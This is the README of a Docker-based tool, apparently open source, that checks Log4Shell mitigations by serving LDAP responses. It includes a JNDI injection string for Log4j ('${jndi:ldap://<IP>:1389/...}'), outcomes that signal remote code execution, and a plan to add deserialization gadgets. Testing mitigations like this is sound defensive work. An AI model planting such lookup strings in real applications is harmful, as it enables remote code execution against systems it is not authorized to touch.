# log4shell-ldap
A tool for checking [log4shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) vulnerability mitigations.

## Usage:
- Build a container image: `docker build . -t log4shell`
- Run it: `docker run -p 3000:3000 -p 1389:1389 -e publicIp=<IP> log4shell`

Replace `<IP>` with an actual IP address of the host running the container. For local tests `localhost` should work just fine. 

Once the tool is running use `curl` to test it's reachable: `curl http://localhost:3000` 

This should print something like this:
```
$ curl http://localhost:3000
To test an application try to make log4j print ${jndi:ldap://localhost:1389/probably_not_vulnerable}
```
This output indicates the tool is running and curl was able to connect to it. 
If `curl` fails then check the IP address passed to `docker run`.

Assuming the `curl` test works then you can test an actual Java application. 
This is the simplest Java application:
```java
package mypackage;

import org.apache.logging.log4j.LogManager;

public class Main {
    public static void main(String[] args) throws Exception {
        LogManager.getLogger(Main.class).fatal("${jndi:ldap://<IP>:1389/probably_not_vulnerable}");
    }
}
```
Again, replace `<IP>` with the IP address you used to start a container image. 
To compile it with Maven you will have to add following dependency into`pom.xml`:
```xml
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.14.1</version>
</dependency>
```
The application has 3 possible outcomes:
- Prints _totally pwned!_. This is happening when a vulnerable log4j2 version is executed on old Java.
   This is the worst case as it allows a very simple arbitrary remote code execution.
- Prints _Reference Class Name: probably vulnerable_. This means a vulnerable log4j2 version is executed on recent Java.
   This makes it a bit harder to abuse the vulnerability, but RCE may still be possible. There are also information disclosure & DoS issues.
   To avoid any possible ambiguity: Don't rely on recent Java. Upgrade your log4j2 to >=2.15.0. 
- Prints _${jndi:ldap://<IP>:1389/probably_not_vulnerable}_
   This means the application is either not vulnerable or the test is misconfigured :)

## Development Setup
To compile the tool outside a container you have to build Java payload first. You can do this by running
a script prepareLocalEnv.sh. This requires JDK8 to be available. The script was tested on Linux only, I appreciate reports
how it works on other platforms.


## TODO
- Refactoring. The code is simply hideous. 
- Public container into DockerHub. Is this a good idea?
- Include Gadgets from the [yoserial project](https://github.com/frohoff/ysoserial) to try to RCE when running 
on recent Java updates. 

## Disclaimer
This is an educational tool created purely for purposes of checking various log4shell mitigations and is not intended
to be used to attack systems except where explicitly authorized. 
Author is not responsible or liable for misuse of the software. Use responsibly.

## Credits
- [yoserial project](https://github.com/frohoff/ysoserial) for the disclaimer:)
- Examples in the [goldap project](https://github.com/vjeantet/ldapserver/blob/9f1711e226a4d7984fd4c9d341a13537a38546a7/examples/complex/main.go). I used the Complex example as a template.
